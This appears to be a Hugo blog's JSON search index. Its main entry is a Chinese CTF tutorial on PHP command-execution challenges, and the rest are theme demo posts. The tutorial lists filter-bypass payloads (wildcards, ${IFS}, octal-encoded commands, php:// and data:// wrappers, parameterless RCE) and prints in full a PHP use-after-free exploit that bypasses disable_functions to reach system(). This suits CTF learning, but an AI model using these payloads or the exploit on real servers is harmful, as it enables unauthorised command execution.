[{"content":" 一、什么是命令执行？ ​ 命令执行漏洞指的是网站的应用程序有些需要调用执行系统命令，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。\n​ 命令执行，执行的有两种命令，一种是搭建网站的Linux系统命令，一个是php自身的函数\n​ 对于一道与命令执行相关的题目，重要的是找到什么函数/命令可以用，怎么用，用来干什么。\n​ 接下来会详细归纳一下怎么做命令执行的题目\n二、可用函数/命令与绕过手法 ​ flag以文件的形式藏在网页目录中，我们需要\n​ **1.**找到flag文件的位置\n​ **2.**读取它\n在php中可以执行Linux命令的常见函数有：\n​ system()、passthru()、exec()、shell_exec()、pcntl_exec()、popen()、proc_open()\n在php中可以执行代码的常见函数有：\n​ eval()、assert()、preg_replace()、$\n​ 当一道题目中出现了eval()等函数之后，我们便可以控制eval()函数的参数，从而让网站执行我们想要执行的命令。\n​ 前面说了，我们需要找到flag文件的位置，需要读取它。所以，我们还需要一些Linux命令和php函数。\n可读取目录的命令/函数 ​ ls （一般也只用ls）\n​ ll：是 ls -l 的缩写，可以显示文件的详细信息，包括权限、所有者、大小、时间戳 等。\n​ la：是 ls -a 的缩写，可以显示所有文件，包括隐藏文件。\n​ tree：可以以树形结构显示目录和文件，更加直观。\n​ dir\n​ echo /* : 可以读目录的（根目录）\n​ exa：是一个比 ls 更加现代化的替代品，支持彩色输出、Git 状态标记、更好的排序 和过滤等功能。\n​ vdir：和 ls 类似，但是可以按照文件修改时间进行排序。\n​ lsd：只显示目录，不显示文件，适合查看目录结构。\n​ print_r(glob(\u0026quot;\u0026quot;)); // 读取当前目录 ​ print_r(glob(\u0026quot;/\u0026quot;)); // 列根目录 ​ var_dump(scandir(chr(47))) 等同于 system(\u0026ldquo;ls /\u0026rdquo;) // (空格，引号被过滤的话，可以替代) ​ print_r(scandir(\u0026rsquo;.\u0026rsquo;)); // 访问当前目录 ​ print_r(scandir(\u0026quot;/\u0026quot;)); //打印一下根目录\n​ $d=opendir(\u0026quot;.\u0026quot;);while(false!==($f=readdir($d))){echo\u0026quot;$f\\n\u0026quot;;} ​ $d=dir(\u0026quot;.\u0026quot;);while(false!==($f=$d-\u0026gt;read())){echo$f.\u0026quot;\\n\u0026quot;;} ​ $a=glob(\u0026quot;/\u0026quot;);foreach($a as $value){echo $value.\u0026quot; \u0026ldquo;;} ​ $a=new DirectoryIterator(\u0026lsquo;glob:///\u0026rsquo;);foreach($a as $f){echo($f-\u0026gt;__toString().\u0026rdquo; \u0026ldquo;);}（根目录）\n可读取文件的命令/函数 ​ cat: 读取文件内容\n​ sort: 可以读取文件内容\n​ less：可以分页显示文件内容，并且支持上下翻页、搜索等操作，适合查看较长的文件 内容。\n​ more：和 less 类似，也可以分页显示文件内容，但是功能比 less 简单。\n​ head：可以显示文件的前几行，默认显示前 10 行。\n​ tail：可以显示文件的后几行，默认显示后 10 行。\n​ nl：可以显示文件的行号，并且可以自定义行号的格式。\n​ grep：可以在文件中查找指定的字符串，支持正则表达式，适合查找特定内容。\n​ awk：可以对文件进行逐行处理和分析，支持多种操作和模式匹配。\n​ tac：和 cat 相反，可以倒序显示文件的内容。\n​ paste：可以将多个文件按列合并，适合处理数据表格。\n​ sed：可以对文件进行逐行处理和替换，支持正则表达式，适合批量修改文本。\n​ 1tr：可以对文件中的字符进行替换和删除等操作，适合批量修改字符集。\n​ hexdump：可以以十六进制的形式显示文件的 内容，并且可以查看文件的二进制格式。\n​ od：可以以八进制或十六进制的形式显示文件的内容，并且可以查看文件的二进制格 式。\n​ pr：可以将文件进行格式化和分页处理，适合打印或排版文本。\n​ fold：可以将长行文本进行折行处理，便于查看和编辑。\n​ highlight_file();\n​ show_source();\n​ file_get_contents();\n​ readfile();\n​ include($filename);\n​ include_once($filename);\n​ require($filename);\n​ require_once($filename);\n绕过手法 ​ 命令执行，需要严格的过滤，这类题目里会用preg_match()函数正则匹配实现过滤\n如果把你需要用到命令/函数/flag给过滤了该怎么办呢\n​ 1.可以换个函数用（bushi）\n​ 2.使用传说中的绕过手法\n通配符绕过 题目把flag过滤了怎么办，无法读取flag，那么可以用通配符匹配绕过\n​ flag\n​ cat flag\n​ cat f???\n​ cat f* 用\u0026rdquo;[!]\u0026ldquo;来替换通配符\u0026rdquo;?\u0026quot;\n​ \u0026ldquo;[!q]\u0026ldquo;表示匹配非q的字符\n​ *: 表示匹配一个或多个\n​ 也用 [^x] 的方法来表示 “这个位置不是字符x”\n​ 可见大写字母位于 @ 与 [ 之间, 可以利用 [@-[] 来表示大写字母\n关键词拼接 tac等读取命令被ban了怎么办？可以用关键词拼接\n​ \\ : 比如ls 被过滤了, 可以使用 l\\s 执行命令\n​ \u0026quot;\u0026rdquo; 或者 \u0026rsquo; \u0026rsquo; : 同理: l\u0026rsquo;\u0026rsquo;s 和 l\u0026quot;\u0026ldquo;s\n​ $@ : 同理 l$@s\n空格绕过 空格都要ban，真是crazy\n​ %20 ：空格url编码\n​ %0d：回车的url\n​ %0a：换行的url\n​ %09 ：Tab 的url\n​ \u0026lt;\n​ \u0026lt;\u0026gt;\n​ ${IFS}\n​ $IFS$1\n后续代码绕过 构造的pyload后面加一个exit();\n过滤掉eval()后面的会影响回响的代码。\n（详情可见web71ctfshow_web67-77_命令执行-CSDN博客）\n三、特殊手法 以上这些知识点可以解决很多题目了，接下来是一些特殊手法\n文件包含 准确来说，文件包含并不属于命令执行的范畴，不过ctfshow命令执行里出现了需要文件包含的题目，这里就一起带过了\n文件包含函数漏洞 （偷个懒，把我之前写的复制粘贴一下QAQ）\n​ 1.require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。\n​ 2.include()，找不到被包含的文件时只会产生警告，脚本将继续运行\n​ 3.highlight_file()\n​ 这里简单来说就是遇到require()函数和include()函数时，可能会触发文件包含的漏洞，具体通过一些伪协议进行包含\n文件包含伪协议 ​ file:// [文件的绝对路径和文件名] ​ php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了 ​ php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n​ zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行 ​ data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n​ data://text/plain/,\u003c?php ‘代码’?\u003e\n（详情可见）\n无参数rce ​ 当过滤几乎把所有标点符号都ban了但是没过滤()的时候，就涉及到无参数rce\n​ （同样偷个懒，复制粘贴一下）\n​ print_r(scandir()) 查看当前目录下的所有文件名\n​ current() 数返回数组中的当前元素（单元）,默认取第一个值可以代替pos();\n​ localeconv() 函数返回一包含本地数字及货币格式信息的数组（其实结果就是 . 是为了上面查看当前目录的）\n​ 也可以用getcwd() 返回当前工作目录(代替pos(localeconv());)\n所以print_r(scandir(current(localeconv())));//print_r(scandir(getcwd()));就是查看当前目录\n怎么读取呢？\n​ array_reverse()顾名思义，数组倒置。\n​ next() 将数组中的内部指针向前移动一位（这里倒置之后移动就正好是flag.php的位置）\n​ show_source() 展示源码\n​ 然后通过指针的移动展示flag所在文件的源码\n（详情见web40ctfshow40-55 命令执行-CSDN博客）\nmv改名/grep .php文件在网页中通常是不显示的。\n有些题目读取了flag.php之后可以得到flag是因为flag.php中有输出flag的代码\n那么如果读取flag.php之后没有显示出flag该怎么办呢\n1.可以用grep命令在flag.php中读取\n2.通过mv改名，把.php文件改名伪.txt文件\ngrep flag flag.php（在flag.php中匹配有flag的字符串并输出）\nmv flag.php a.txt\n（详情见web54ctfshow40-55 命令执行-CSDN博客）\nAscii码替代字母 首先，在终端中，$'\\xxx'可以将八进制ascii码解析为字符\n在题目中ban了所有字母时，就可以用这个方式来执行命令\n例：$%27\\154\\163%27\n%27是 '\n154八进制转换为十进制转化为Ascii码为l\n163是s\n所以这个命令就是 ls\n炫技1.0 偷个懒，截一下之前的图\n编辑\n​ 这里再给个原码\n1 2 3 4 5 6 import requests url = \u0026#34;http://7ddc2667-c299-4a6f-824d-29746a045d38.challenge.ctf.show/?c=.+/???/????????[@-[]\u0026#34; r = requests.post(url, files={\u0026#34;file\u0026#34;: (\u0026#39;feng.txt\u0026#39;, b\u0026#39;cat flag.php\u0026#39;)}) if r.text.find(\u0026#34;flag\u0026#34;) \u0026gt; 0: print(r.text) 炫技2.0 当网站目录被open_basedir和disable_function限制了，也就是无法打开open_basedir锁定树之外的文件也无法用disable_function函数ban掉的函数时\n可以用开源脚本进行绕过（原理我也不懂）\nc=function ctfshow($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-\u0026gt;a); $backtrace = (new Exception)-\u0026gt;getTrace(); if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u0026gt;= 0; $j--) { $address \u0026lt;\u0026lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \u0026#34;\u0026#34;; for ($i=0; $i \u0026lt; $m; $i++) { $out .= sprintf(\u0026#34;%c\u0026#34;,($ptr \u0026amp; 0xff)); $ptr \u0026gt;\u0026gt;= 8; } return $out; } function write(\u0026amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u0026lt; $n; $i++) { $str[$p + $i] = sprintf(\u0026#34;%c\u0026#34;,($v \u0026amp; 0xff)); $v \u0026gt;\u0026gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u0026gt;a); if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u0026lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u0026lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026amp; 0xfffffffffffff000; for($i = 0; $i \u0026lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); $vuln = new Vuln(); $vuln-\u0026gt;a = $arg; } if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); } $n_alloc = 10; $contiguous = []; for($i = 0; $i \u0026lt; $n_alloc; $i++) $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); trigger_uaf(\u0026#39;x\u0026#39;); $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; $helper = new Helper; $helper-\u0026gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\u0026#34;UAF failed\u0026#34;); } $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); } if(!($elf = parse_elf($base))) { die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); } if(!($zif_system = get_system($basic_funcs))) { die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); } $fake_obj_offset = 0xd0; for($i = 0; $i \u0026lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-\u0026gt;b)($cmd); exit(); } ctfshow(\u0026#34;cat /flag0.txt\u0026#34;);ob_end_flush(); #需要通过url编码哦 发包后记得url编码一下\n四、小结 ​ 命令执行到这就差不多了，特殊手法虽然没有完全归纳，不过大致的解题思路和绕过手法都有提到，希望大家能从中学到东西。\n","date":"2025-02-26T14:31:23+08:00","permalink":"https://liernian.github.ioS/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"命令执行"},{"content":"正文测试 而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用 思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n图片 1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"https://liernian.github.ioS/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_2307260c751d0e0b.jpg","permalink":"https://liernian.github.ioS/p/test-chinese/","title":"Chinese Test"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTeX globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTeX on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Inline math: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\n$$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$","date":"2019-03-08T00:00:00Z","permalink":"https://liernian.github.ioS/p/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"https://liernian.github.ioS/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_hu_27b8954607cdb515.jpg","permalink":"https://liernian.github.ioS/p/emoji-support/","title":"Emoji Support"}]